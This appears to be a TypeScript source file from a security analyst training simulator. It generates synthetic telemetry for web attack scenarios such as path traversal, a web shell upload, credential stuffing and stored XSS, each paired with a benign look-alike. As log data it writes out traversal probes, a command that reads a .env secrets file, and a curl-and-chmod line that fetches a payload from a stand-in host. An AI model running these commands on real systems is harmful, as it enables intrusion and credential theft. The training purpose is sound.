/**
 * Web application attack stories, part 1: foundation and core (Team Training only).
 *
 * Each story reads across a WAF, the origin web server and at least one more source, ends in
 * something the analyst must scope, and carries a benign look-alike in the same shape: the same
 * rule fired by a scanner, a pen test, a partner job, a broken client. The WAF and access log rows
 * are vendor-neutral (emitters/web.ts): the session's stack prints them as AWS WAF or Azure WAF, and
 * as nginx or IIS. A story that shows the server's own processes binds its access log to that server.
 *
 * A web server's name stays dotted: it is a named service of the estate, kept on every company
 * (its domain follows the company). URLs and parameters are complete and inert: a textbook probe or
 * a placeholder value, never a working payload.
 */
import type { TelemetryEvent } from "@/lib/sim/types";
import { serviceNowRecord } from "@/lib/sim/emitters/servicenow";
import { panWeb } from "@/lib/sim/emitters/paloalto";
import { csFile, csNetwork, csProcess } from "@/lib/sim/emitters/crowdstrike";
import { graphqlAppLog, wafRequest, webAccess, type WebSite } from "@/lib/sim/emitters/web";
import { makeSha256 } from "@/lib/sim/iocs";

export interface WebStoryDef {
  id: string;
  title: string;
  complexity: "foundation" | "core" | "advanced";
  events: TelemetryEvent[];
  /** Only where a story's systems exist at all (an online store); omitted, the source-fit rule decides. */
  companies?: string[];
  /** The job of the story's staff member: an admin or a service desk agent is an IT seat on every company. */
  seat?: "it";
  /** The parametric template this story is a variant of (AttackStory.family). */
  family?: string;
}

const IA = "Initial Access", COLLECT = "Collection", CRED = "Credential Access", EXEC = "Execution", PERSIST = "Persistence", C2 = "Command and Control", IMPACT = "Impact", STEALTH = "Stealth";

/** Minutes after a story's start, as an ISO time. */
export const clock = (iso: string) => { const b = Date.parse(iso); return (min: number) => new Date(b + min * 60_000).toISOString(); };
/** The account a connection row's process runs as, where the emitter takes none. */
export const asUser = (e: TelemetryEvent, user: string): TelemetryEvent => ({ ...e, process: e.process ? { ...e.process, user } : e.process });
/** Context row: the approved change or request behind a look-alike. */
export const ticket = (o: Parameters<typeof serviceNowRecord>[0]): TelemetryEvent => ({ ...serviceNowRecord(o), is_baseline: true });
/** A byte count as a row description prints it (1,902). */
export const bytesText = (n: number) => n.toLocaleString("en-US");

const CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36";
const SCANNER = "Mozilla/5.0 (compatible; ASV-Scanner/9.6; +https://scanner.example/about)";
const PY = "python-requests/2.31.0";
/** Outbound web rule with TLS decryption on: the firewall sees full URLs only under it. */
const DECRYPT = "ALLOW-WEB-OUT-DECRYPT";

// ══════════════════════════════════════════════════════════════════════════════
// 1. Path traversal to configuration files: foundation. One site, one client.
// ══════════════════════════════════════════════════════════════════════════════
function pathTraversal(): TelemetryEvent[] {
  const T = clock("2026-09-08T08:00:00Z");
  const w: WebSite = { site: "portal.nexacorp.com", host: "web-portal-01.nexacorp.com", ip: "10.20.40.21" };
  const atk = "203.0.113.106", scan = "198.51.100.200", ua = PY;
  const f = "/download";
  return [
    ticket({ id: "web_pt_001", ts: T(0), table: "change_request", number: "CHG0044120", state: "Implement", severity: "informational",
      shortDescription: "External ASV vulnerability scan of public sites, source 198.51.100.200", description: "ServiceNow change CHG0044120 (Implement): external vulnerability scan of public sites" }),
    webAccess(w, { id: "web_pt_002", ts: T(4), srcIp: "198.51.100.12", path: f, query: "file=brochure-2026.pdf", bytes: 812344, ua: CHROME, isBaseline: true, description: "Customer downloaded a document from the portal" }),
    wafRequest(w, { id: "web_pt_003", ts: T(9), srcIp: scan, path: f, query: "file=..%2F..%2F..%2Fetc%2Fpasswd", action: "block", rule: "lfi_query", matched: "../", location: "ARGS:file", ua: SCANNER, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The approved external scan under CHG0044120: its source address and its user agent match the change, and it never got past the block.", description: "WAF rule matched a path sequence in the file parameter of /download" }),
    wafRequest(w, { id: "web_pt_004", ts: T(62), srcIp: atk, path: f, query: "file=..%2F..%2F..%2Fetc%2Fpasswd", action: "block", rule: "lfi_query", matched: "../", location: "ARGS:file", ua, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched a path sequence in the file parameter of /download" }),
    wafRequest(w, { id: "web_pt_005", ts: T(62.5), srcIp: atk, path: f, query: "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", action: "block", rule: "lfi_query", matched: "../", location: "ARGS:file", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched a path sequence in the file parameter of /download" }),
    wafRequest(w, { id: "web_pt_006", ts: T(64), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F....%2F%2Fconfig%2Fappsettings.json", action: "allow", ua, bytes: 3122, description: "WAF passed a request to /download" }),
    webAccess(w, { id: "web_pt_007", ts: T(64.1), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F....%2F%2Fconfig%2Fappsettings.json", bytes: 3122, ua, mitre: "T1552.001", tactic: CRED, severity: "low", description: "Web server answered a request to /download" }),
    webAccess(w, { id: "web_pt_008", ts: T(65), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F....%2F%2Fconfig%2Fappsettings.Production.json", bytes: 2048, ua, mitre: "T1552.001", tactic: CRED, severity: "low", description: "Web server answered a request to /download" }),
    webAccess(w, { id: "web_pt_009", ts: T(67), srcIp: atk, path: f, query: "file=....%2F%2F....%2F%2F....%2F%2Fbackup%2Fportal-db.sql.gz", bytes: 48211933, ua, mitre: "T1005", tactic: COLLECT, severity: "medium", description: "Web server answered a request to /download" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 2. Broken object level authorization on an API: foundation. One token, one API.
// ══════════════════════════════════════════════════════════════════════════════
function objectWalk(): TelemetryEvent[] {
  const T = clock("2026-09-09T13:00:00Z");
  const w: WebSite = { site: "api.nexacorp.com", host: "web-api-01.nexacorp.com", ip: "10.20.40.31" };
  const atk = "203.0.113.105", partner = "198.51.100.140", ua = "okhttp/4.12.0";
  // The app sends the signed-in account on every call: one account, many customers' objects.
  const statement = (id: string, n: number, min: number, bytes: number, extra = {}) =>
    webAccess(w, { id, ts: T(min), srcIp: atk, path: `/api/v2/customers/${n}/statements`, query: "session_acct=48213", bytes, ua, description: "API answered a statements request", ...extra });
  return [
    ticket({ id: "web_bola_001", ts: T(0), table: "sc_req_item", number: "RITM0051877", state: "Closed Complete", severity: "informational",
      shortDescription: "Partner reconciliation job, partner 2207, daily batch from 198.51.100.140", description: "ServiceNow request RITM0051877 (Closed Complete): partner reconciliation batch job" }),
    wafRequest(w, { id: "web_bola_002", ts: T(6), srcIp: partner, path: "/api/v2/partners/2207/statements", query: "page=12", action: "count", rule: "rate", rateLimit: 300, rateWindowSec: 300, ua: "PartnerSync/3.1", severity: "medium", isDetection: true, mitre: "T1119", tactic: COLLECT, verdict: "fp",
      fpExplanation: "The partner's approved reconciliation job (RITM0051877): it reads its own partner path with paging, from its registered address, and goes over the rate limit every day.", description: "Rate rule evaluated a client over its limit on the statements API" }),
    webAccess(w, { id: "web_bola_003", ts: T(41), srcIp: atk, method: "POST", path: "/api/v2/login", status: 200, bytes: 412, ua, description: "API answered a sign-in" }),
    statement("web_bola_004", 48213, 42, 18207),
    statement("web_bola_005", 48214, 42.1, 18442, { mitre: "T1190", tactic: IA }),
    statement("web_bola_006", 48215, 42.2, 17966, { mitre: "T1190", tactic: IA }),
    statement("web_bola_007", 48216, 42.3, 19011, { mitre: "T1119", tactic: COLLECT }),
    wafRequest(w, { id: "web_bola_008", ts: T(46), srcIp: atk, path: "/api/v2/customers/48244/statements", query: "session_acct=48213", action: "count", rule: "rate", rateLimit: 300, rateWindowSec: 300, ua, severity: "medium", isDetection: true, mitre: "T1119", tactic: COLLECT, description: "Rate rule evaluated a client over its limit on the statements API" }),
    statement("web_bola_009", 48244, 46.1, 18119, { mitre: "T1119", tactic: COLLECT }),
    statement("web_bola_010", 49530, 58, 17803, { mitre: "T1119", tactic: COLLECT }),
    webAccess(w, { id: "web_bola_011", ts: T(58.2), srcIp: atk, path: "/api/v2/customers/49530/documents/id-scan.pdf", query: "session_acct=48213", bytes: 2284113, ua, mitre: "T1119", tactic: COLLECT, severity: "medium", description: "API answered a document request" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 3. Credential stuffing against a customer login: core.
// ══════════════════════════════════════════════════════════════════════════════
function credentialStuffing(): TelemetryEvent[] {
  const T = clock("2026-09-10T19:00:00Z");
  const w: WebSite = { site: "portal.nexacorp.com", host: "web-portal-02.nexacorp.com", ip: "10.20.40.22" };
  const ua = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15";
  const app = "CustomerApp/5.1.9 (Android 14)", nat = "198.51.100.150", win = "198.51.100.61";
  const login = (id: string, min: number, ip: string, status: number, extra = {}) =>
    webAccess(w, { id, ts: T(min), srcIp: ip, method: "POST", path: "/account/login", status, bytes: status === 302 ? 0 : 391, ua, description: "Portal answered a sign-in", ...extra });
  return [
    ticket({ id: "web_cs_001", ts: T(0), table: "incident", number: "INC0091377", state: "In Progress", severity: "informational",
      shortDescription: "Mobile app 5.1.9 retries sign-in with an expired refresh token, fix in 5.2.0", description: "ServiceNow incident INC0091377 (In Progress): mobile app 5.1.9 sign-in retry defect" }),
    wafRequest(w, { id: "web_cs_002", ts: T(5), srcIp: nat, method: "POST", path: "/account/login", action: "block", rule: "login_volumetric", ua: app, severity: "medium", isDetection: true, mitre: "T1110.004", tactic: CRED, verdict: "fp",
      fpExplanation: "The known mobile app defect in INC0091377: one app version behind one carrier gateway, failing on an expired token, and no sign-in succeeds from it.", description: "Login traffic flagged for volume from one address" }),
    webAccess(w, { id: "web_cs_003", ts: T(5.2), srcIp: nat, method: "POST", path: "/account/login", status: 401, bytes: 391, ua: app, isBaseline: true, description: "Portal answered a sign-in" }),
    login("web_cs_004", 32, "203.0.113.163", 401, { mitre: "T1110.004", tactic: CRED }),
    login("web_cs_005", 32.2, "203.0.113.121", 401, { mitre: "T1110.004", tactic: CRED }),
    wafRequest(w, { id: "web_cs_006", ts: T(33), srcIp: "203.0.113.121", method: "POST", path: "/account/login", action: "block", rule: "login_volumetric", ua, severity: "medium", isDetection: true, mitre: "T1110.004", tactic: CRED, description: "Login traffic flagged for volume from one address" }),
    login("web_cs_007", 33.5, "203.0.113.62", 401, { mitre: "T1110.004", tactic: CRED }),
    wafRequest(w, { id: "web_cs_008", ts: T(34), srcIp: "203.0.113.62", method: "POST", path: "/account/login", action: "block", rule: "login_stolen", ua, severity: "high", isDetection: true, mitre: "T1110.004", tactic: CRED, description: "Login traffic flagged for repeated sign-in attempts" }),
    wafRequest(w, { id: "web_cs_015", ts: T(36), srcIp: win, method: "POST", path: "/account/login", action: "allow", ua, status: 302, bytes: 0, description: "WAF passed a request to /account/login" }),
    login("web_cs_009", 36, win, 302, { mitre: "T1078", tactic: IA }),
    webAccess(w, { id: "web_cs_010", ts: T(36.3), srcIp: win, path: "/account/profile", query: "cid=771204", bytes: 6120, ua, mitre: "T1078", tactic: IA, description: "Portal answered a profile request" }),
    webAccess(w, { id: "web_cs_011", ts: T(37), srcIp: win, method: "POST", path: "/account/profile/email", query: "cid=771204", bytes: 288, ua, mitre: "T1098", tactic: PERSIST, severity: "medium", description: "Portal answered a profile change" }),
    webAccess(w, { id: "web_cs_012", ts: T(38), srcIp: win, path: "/account/documents/export", query: "cid=771204", bytes: 418220, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Portal answered a document export" }),
    login("web_cs_013", 41, win, 302, { query: "ReturnUrl=%2Faccount%2Fdocuments%2Fexport", mitre: "T1078", tactic: IA }),
    webAccess(w, { id: "web_cs_014", ts: T(41.4), srcIp: win, path: "/account/documents/export", query: "cid=690377", bytes: 396114, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Portal answered a document export" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 4. Password reset poisoning: core. A staff account's reset link built on the client's Host.
// ══════════════════════════════════════════════════════════════════════════════
function resetPoisoning(): TelemetryEvent[] {
  const T = clock("2026-09-14T09:00:00Z");
  const w: WebSite = { site: "portal.nexacorp.com", host: "web-portal-03.nexacorp.com", ip: "10.20.40.23" };
  const atk = "203.0.113.116", evil = "reset-portal.example", ua = CHROME;
  const token = "7c1e49d2a0b64f3e", cust = "198.51.100.130", appUa = "CustomerApp/5.2.0 (iOS 17.5) CFNetwork/1498", custUa = "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1";
  return [
    wafRequest(w, { id: "web_rp_000", ts: T(3), srcIp: cust, method: "POST", path: "/account/password/forgot", action: "count", rule: "custom", ruleName: "HostHeaderNotAllowlisted", matched: "portal.nexacorp.com:443", location: "REQUEST_HEADERS:Host", hostHeader: "portal.nexacorp.com:443", ua: appUa, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The customer app's HTTP client sends the default port in the Host header: the name is the site's own, and the reset link was then used from the same address.", description: "Custom rule evaluated the Host header of a password reset request" }),
    webAccess(w, { id: "web_rp_001", ts: T(3), srcIp: cust, method: "POST", path: "/account/password/forgot", hostHeader: "portal.nexacorp.com:443", bytes: 512, ua: appUa, isBaseline: true, description: "Portal answered a password reset request" }),
    webAccess(w, { id: "web_rp_002", ts: T(5), srcIp: cust, path: "/account/reset", query: "token=2f90b7c1d3e84a6f", bytes: 3320, ua: custUa, isBaseline: true, description: "Portal answered a reset link" }),
    webAccess(w, { id: "web_rp_003", ts: T(5.5), srcIp: cust, method: "POST", path: "/account/reset", status: 302, bytes: 0, ua: custUa, isBaseline: true, description: "Portal answered a password change" }),
    wafRequest(w, { id: "web_rp_004", ts: T(38), srcIp: atk, method: "POST", path: "/account/password/forgot", action: "count", rule: "custom", ruleName: "HostHeaderNotAllowlisted", matched: evil, location: "REQUEST_HEADERS:Host", hostHeader: evil, ua, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "Custom rule evaluated the Host header of a password reset request" }),
    webAccess(w, { id: "web_rp_005", ts: T(38.1), srcIp: atk, method: "POST", path: "/account/password/forgot", hostHeader: evil, bytes: 512, ua, mitre: "T1190", tactic: IA, description: "Portal answered a password reset request" }),
    panWeb({ id: "web_rp_006", ts: T(44), host: "WS-OPS-2214", user: "m.ops@nexacorp.com", srcIp: "10.10.20.14", rule: DECRYPT, url: `https://${evil}/account/reset?token=${token}`, domain: evil, dstIp: "203.0.113.102", category: "newly-registered-domain", action: "alert", userAgent: CHROME, severity: "medium", description: "User workstation requested a page on a newly registered domain" }),
    webAccess(w, { id: "web_rp_007", ts: T(46), srcIp: atk, path: "/account/reset", query: `token=${token}`, bytes: 3320, ua, mitre: "T1078", tactic: IA, description: "Portal answered a reset link" }),
    webAccess(w, { id: "web_rp_008", ts: T(46.5), srcIp: atk, method: "POST", path: "/account/reset", status: 302, bytes: 0, ua, mitre: "T1098", tactic: PERSIST, severity: "medium", description: "Portal answered a password change" }),
    webAccess(w, { id: "web_rp_009", ts: T(47), srcIp: atk, method: "POST", path: "/account/login", status: 302, bytes: 0, ua, mitre: "T1078", tactic: IA, description: "Portal answered a sign-in" }),
    wafRequest(w, { id: "web_rp_011", ts: T(49), srcIp: atk, path: "/admin/customers/export", query: "format=csv", action: "allow", ua, bytes: 31844207, description: "WAF passed a request to /admin/customers/export" }),
    webAccess(w, { id: "web_rp_010", ts: T(49), srcIp: atk, path: "/admin/customers/export", query: "format=csv", bytes: 31844207, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Portal answered an admin export" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 5. Stored XSS to a support agent's session: core.
// ══════════════════════════════════════════════════════════════════════════════
function storedXss(): TelemetryEvent[] {
  const T = clock("2026-09-15T10:00:00Z");
  const w: WebSite = { site: "support.nexacorp.com", host: "web-support-01.nexacorp.com", ip: "10.20.40.41", wafMode: "Detection" };
  const atk = "203.0.113.112", agentIp = "10.10.20.19", collect = "img.helpdesk-cdn.example";
  const ua = "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0";
  return [
    wafRequest(w, { id: "web_xs_001", ts: T(7), srcIp: agentIp, method: "POST", path: "/admin/tickets/88190/reply", action: "count", rule: "xss_body", matched: "<table style=", location: "ARGS:body", ua: CHROME, status: 201, severity: "medium", isDetection: true, mitre: "T1059.007", tactic: EXEC, verdict: "fp",
      fpExplanation: "A support agent's reply from the office with the HTML signature of the ticket editor. This false match is why the rule is in Count on this site.", description: "WAF rule matched HTML in a ticket body" }),
    wafRequest(w, { id: "web_xs_002", ts: T(52), srcIp: atk, method: "POST", path: "/tickets", action: "count", rule: "xss_body", matched: "<svg", location: "ARGS:body", ua, status: 201, severity: "medium", isDetection: true, mitre: "T1059.007", tactic: EXEC, description: "WAF rule matched HTML in a ticket body" }),
    webAccess(w, { id: "web_xs_003", ts: T(52.1), srcIp: atk, method: "POST", path: "/tickets", status: 201, bytes: 744, sent: 2318, ua, mitre: "T1059.007", tactic: EXEC, description: "Support site answered a new ticket" }),
    webAccess(w, { id: "web_xs_004", ts: T(71), srcIp: agentIp, path: "/admin/tickets/88213", bytes: 22410, ua: CHROME, referer: "https://support.nexacorp.com/admin/tickets?status=open", isBaseline: true, description: "Support site answered a ticket view" }),
    panWeb({ id: "web_xs_005", ts: T(71.1), host: "WS-IT-1876", user: "a.ops@nexacorp.com", srcIp: agentIp, rule: DECRYPT, url: `https://${collect}/p.gif?c=5e0b7a913fd2`, domain: collect, dstIp: "203.0.113.113", category: "unknown", action: "alert", referer: "https://support.nexacorp.com/admin/tickets/88213", userAgent: CHROME, mitre: "T1539", tactic: CRED, severity: "medium", description: "User workstation requested an image from an uncategorized domain" }),
    webAccess(w, { id: "web_xs_006", ts: T(74), srcIp: atk, path: "/admin/tickets", query: "status=open", bytes: 18112, ua, mitre: "T1550.004", tactic: STEALTH, description: "Support site answered a ticket list" }),
    webAccess(w, { id: "web_xs_007", ts: T(76), srcIp: atk, path: "/admin/customers/search", query: "q=a", bytes: 40218, ua, mitre: "T1550.004", tactic: STEALTH, description: "Support site answered a customer search" }),
    webAccess(w, { id: "web_xs_008", ts: T(78), srcIp: atk, method: "POST", path: "/admin/users/invite", status: 201, bytes: 318, ua, mitre: "T1136", tactic: PERSIST, severity: "medium", description: "Support site answered a user invitation" }),
    webAccess(w, { id: "web_xs_009", ts: T(81), srcIp: atk, path: "/admin/tickets/export", query: "from=2026-06-01", bytes: 27330914, ua, mitre: "T1213", tactic: COLLECT, severity: "medium", description: "Support site answered a ticket export" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 6. Unrestricted file upload to a web shell: core. nginx + php-fpm on Linux.
// ══════════════════════════════════════════════════════════════════════════════
function uploadShell(): TelemetryEvent[] {
  const T = clock("2026-09-16T14:00:00Z");
  const w: WebSite = { site: "members.nexacorp.com", host: "web-members-01.nexacorp.com", ip: "10.20.40.51", server: "nginx", wafMode: "Detection" };
  const atk = "203.0.113.108", ua = PY, mirror = "dl.files-mirror.example", c2 = "198.51.100.71";
  const shell = "/uploads/avatars/7731/avatar.php";
  const root = "/var/www/members/public";
  const FPM = { parentName: "php-fpm8.2", parentPid: 21840 };
  const payload = makeSha256("web_members_tmp_k_payload");
  const host = { host: w.host, user: null, srcIp: w.ip };
  const sh = (id: string, min: number, pid: number, cmd: string, extra = {}) => csProcess({ id, ts: T(min), ...host, processName: "dash", processPath: "/usr/bin/dash", cmdline: cmd, pid, ...FPM, runAsUser: "www-data",
    sha256: makeSha256("usr_bin_dash_debian_signed"), description: `Process started on ${w.host}`, ...extra });
  return [
    ticket({ id: "web_up_001", ts: T(0), table: "change_request", number: "CHG0044198", state: "Implement", severity: "informational",
      shortDescription: "Members site theme update, uploaded by web team from the office", description: "ServiceNow change CHG0044198 (Implement): members site theme update" }),
    wafRequest(w, { id: "web_up_002", ts: T(6), srcIp: "10.10.20.33", method: "POST", path: "/admin/theme/upload", action: "count", rule: "php_body", matched: "<?php", location: "REQUEST_BODY", ua: CHROME, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, verdict: "fp",
      fpExplanation: "The web team's approved theme package under CHG0044198: it holds PHP templates by design, it comes from the office, and it goes through the admin path.", description: "WAF rule matched PHP code in an upload" }),
    wafRequest(w, { id: "web_up_003", ts: T(48), srcIp: atk, method: "POST", path: "/account/avatar", action: "count", rule: "php_body", matched: "<?php", location: "REQUEST_BODY", ua, sent: 4210, bytes: 288, severity: "medium", isDetection: true, mitre: "T1190", tactic: IA, description: "WAF rule matched PHP code in an upload" }),
    webAccess(w, { id: "web_up_004", ts: T(48.1), srcIp: atk, method: "POST", path: "/account/avatar", bytes: 288, sent: 4210, ua, mitre: "T1190", tactic: IA, description: "Members site answered an avatar upload" }),
    csFile({ id: "web_up_005", ts: T(48.1), ...host, path: `${root}${shell}`, size: 3896, actorProcess: "php-fpm8.2", actorPath: "/usr/sbin/php-fpm8.2", actorPid: 21902, runAsUser: "www-data", mitre: "T1505.003", tactic: PERSIST, severity: "medium", description: `File written under the web root on ${w.host}` }),
    webAccess(w, { id: "web_up_006", ts: T(49), srcIp: atk, method: "POST", path: shell, bytes: 43, sent: 96, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder (96 bytes in, 43 bytes out)" }),
    sh("web_up_007", 49.1, 21977, "sh -c id", { isDetection: true, severity: "high", mitre: "T1059.004", tactic: EXEC }),
    sh("web_up_008", 51, 22014, "sh -c cat /var/www/members/.env", { mitre: "T1552.001", tactic: CRED, severity: "medium" }),
    webAccess(w, { id: "web_up_009", ts: T(51), srcIp: atk, method: "POST", path: shell, bytes: 1902, sent: 512, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder (512 bytes in, 1,902 bytes out)" }),
    sh("web_up_010", 53, 22061, `sh -c curl -s https://${mirror}/k -o /tmp/.k && chmod +x /tmp/.k`, { mitre: "T1105", tactic: C2, severity: "medium" }),
    panWeb({ id: "web_up_011", ts: T(53), host: w.host, user: null, srcIp: w.ip, url: `https://${mirror}/k`, domain: mirror, dstIp: "198.51.100.72", category: "unknown", action: "alert", userAgent: "curl/8.5.0", bytesIn: 2841200, severity: "medium", mitre: "T1105", tactic: C2, description: "Server downloaded a file from an uncategorized domain" }),
    webAccess(w, { id: "web_up_013", ts: T(54.7), srcIp: atk, method: "POST", path: shell, bytes: 28, sent: 88, ua, mitre: "T1505.003", tactic: PERSIST, description: "Members site answered a request in the uploads folder (88 bytes in, 28 bytes out)" }),
    sh("web_up_014", 54.8, 22090, "sh -c /tmp/.k", { mitre: "T1059.004", tactic: EXEC, severity: "medium" }),
    csProcess({ id: "web_up_015", ts: T(54.9), ...host, processName: ".k", processPath: "/tmp/.k", cmdline: "/tmp/.k", pid: 22107, parentName: "dash", parentPid: 22090, runAsUser: "www-data", sha256: payload, mitre: "T1059.004", tactic: EXEC, severity: "medium", description: `Process started on ${w.host}` }),
    asUser(csNetwork({ id: "web_up_012", ts: T(55), ...host, remoteIp: c2, remotePort: 443, processName: ".k", processPath: "/tmp/.k", cmdline: "/tmp/.k", pid: 22107, parentName: "dash", parentPid: 22090, sha256: payload, mitre: "T1071.001", tactic: C2, severity: "medium", description: `Outbound connection from ${w.host}` }), "www-data"),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 7. GraphQL schema discovery and batched sign-in guessing: core.
// ══════════════════════════════════════════════════════════════════════════════
function graphqlBatch(): TelemetryEvent[] {
  const T = clock("2026-09-17T07:30:00Z");
  const w: WebSite = { site: "graph.nexacorp.com", host: "web-graph-01.nexacorp.com", ip: "10.20.40.61" };
  const atk = "203.0.113.151", ua = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36";
  const portal: WebSite = { site: "portal.nexacorp.com", host: "web-portal-04.nexacorp.com", ip: "10.20.40.62" };
  const app = "CustomerApp/5.2.0 (iOS 17.5)", nat = "198.51.100.152";
  // One app-log line per request: the operation, how many aliased fields it asked for, and the errors
  // the response carried. Each alias of a batched SignIn is one password guess; each UNAUTHENTICATED is
  // one that failed, inside a response the edge logged as a single 200.
  const gql = (id: string, min: number, client: string, agent: string, op: string, aliases: number, errors: Record<string, number> | undefined, ms: number, reqId: number, extra: { isBaseline?: boolean; description?: string; mitre?: string; tactic?: string } = {}) =>
    graphqlAppLog(w, { id, ts: T(min), clientIp: client, ua: agent, operationName: op, aliases, errors, responseMs: ms, pid: 41, reqId,
      description: extra.description ?? `GraphQL service completed a ${op} request with ${aliases} aliased fields and ${Object.values(errors ?? {}).reduce((a, b) => a + b, 0)} errors`, ...extra });
  const post = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: "/graphql", sent, bytes, ua, description: `GraphQL endpoint answered a request (${bytesText(sent)} bytes in, ${bytesText(bytes)} bytes out)`, ...extra });
  return [
    wafRequest(w, { id: "web_gq_001", ts: T(3), srcIp: nat, method: "POST", path: "/graphql", action: "count", rule: "size_body", ua: app, sent: 9214, bytes: 41022, severity: "low", mitre: "T1110.001", tactic: CRED, verdict: "fp",
      fpExplanation: "The mobile app's home screen: a large query from a current app version, with a large response and no sign-in in it.", description: "WAF rule evaluated a large request body on the GraphQL endpoint" }),
    webAccess(w, { id: "web_gq_002", ts: T(3.1), srcIp: nat, method: "POST", path: "/graphql", sent: 9214, bytes: 41022, ua: app, isBaseline: true, description: "GraphQL endpoint answered a request" }),
    // The GraphQL service's own request log (pino-http): what the app saw inside each request.
    gql("web_gq_002a", 3.11, nat, app, "HomeFeed", 0, undefined, 212, 18311, { isBaseline: true, description: "GraphQL service completed a HomeFeed query" }),
    gql("web_gq_002b", 9.4, nat, app, "SignIn", 1, { UNAUTHENTICATED: 1 }, 96, 18522, { isBaseline: true, description: "GraphQL service completed a SignIn request with one error" }),
    gql("web_gq_002c", 9.9, nat, app, "SignIn", 1, undefined, 141, 18547, { isBaseline: true, description: "GraphQL service completed a SignIn request" }),
    wafRequest(w, { id: "web_gq_003", ts: T(31), srcIp: atk, method: "POST", path: "/graphql", action: "block", rule: "custom", ruleName: "BlockGraphqlIntrospection", matched: "__schema", location: "REQUEST_BODY", ua, severity: "medium", isDetection: true, description: "Custom rule evaluated the body of a GraphQL request" }),
    post("web_gq_004", 33, 1188, 2204),
    wafRequest(w, { id: "web_gq_005", ts: T(36), srcIp: atk, method: "POST", path: "/graphql", action: "count", rule: "size_body", ua, sent: 18774, bytes: 1204, severity: "low", mitre: "T1110.001", tactic: CRED, description: "WAF rule evaluated a large request body on the GraphQL endpoint" }),
    post("web_gq_006", 36, 18774, 1204, { mitre: "T1110.001", tactic: CRED }),
    gql("web_gq_006a", 36.01, atk, ua, "SignIn", 250, { UNAUTHENTICATED: 250 }, 2210, 22904, { mitre: "T1110.001", tactic: CRED }),
    post("web_gq_007", 36.4, 18802, 1204, { mitre: "T1110.001", tactic: CRED }),
    gql("web_gq_007a", 36.41, atk, ua, "SignIn", 251, { UNAUTHENTICATED: 251 }, 2187, 22911, { mitre: "T1110.001", tactic: CRED }),
    post("web_gq_008", 36.8, 18790, 1204, { mitre: "T1110.001", tactic: CRED }),
    gql("web_gq_008a", 36.81, atk, ua, "SignIn", 249, { UNAUTHENTICATED: 249 }, 2242, 22917, { mitre: "T1110.001", tactic: CRED }),
    post("web_gq_009", 37.2, 18781, 1661, { mitre: "T1110.001", tactic: CRED }),
    gql("web_gq_009a", 37.21, atk, ua, "SignIn", 250, { UNAUTHENTICATED: 249 }, 2231, 22926, { mitre: "T1110.001", tactic: CRED }),
    webAccess(portal, { id: "web_gq_010", ts: T(38), srcIp: atk, path: "/account/orders", query: "cid=512088", bytes: 14420, ua, mitre: "T1078", tactic: IA, description: "Portal answered an orders request" }),
    webAccess(portal, { id: "web_gq_011", ts: T(39), srcIp: atk, method: "POST", path: "/account/payment-methods", query: "cid=512088", bytes: 322, ua, mitre: "T1657", tactic: IMPACT, severity: "medium", description: "Portal answered a payment method change" }),
  ];
}

// ══════════════════════════════════════════════════════════════════════════════
// 8. WAF evasion after a block: core. A body longer than the WAF reads, SQL injection past its end.
// AWS WAF on a load balancer reads the first 8 KB of a body; an Application Gateway policy with the
// size limit off reads up to its inspection limit. The rest reaches the application unread. A body of
// about 140 KB is past both, and the site runs its size rule in Count for its bulk order form.
// ══════════════════════════════════════════════════════════════════════════════
function wafEvasion(): TelemetryEvent[] {
  const T = clock("2026-09-21T12:00:00Z");
  const w: WebSite = { site: "shop.nexacorp.com", host: "web-shop-01.nexacorp.com", ip: "10.20.40.71" };
  const atk = "198.51.100.10", pen = "198.51.100.210", ua = PY, p = "/products", s = "/products/search", big = 142208;
  const blocked = (id: string, min: number, query: string, extra = {}) => wafRequest(w, { id, ts: T(min), srcIp: atk, path: p, query, action: "block", rule: "sqli_query", matched: "UNION SELECT", location: "ARGS:id", ua, severity: "medium", mitre: "T1190", tactic: IA, description: "WAF rule matched SQL syntax in the id parameter of /products", ...extra });
  // The padding is fixed; the SQL past it changes with each query, so every body has its own length.
  const passed = (id: string, min: number, sent: number, bytes: number, extra = {}) => webAccess(w, { id, ts: T(min), srcIp: atk, method: "POST", path: s, sent, bytes, ua, mitre: "T1190", tactic: IA, description: `Shop answered a product search (${bytesText(sent)} bytes in, ${bytesText(bytes)} bytes out)`, ...extra });
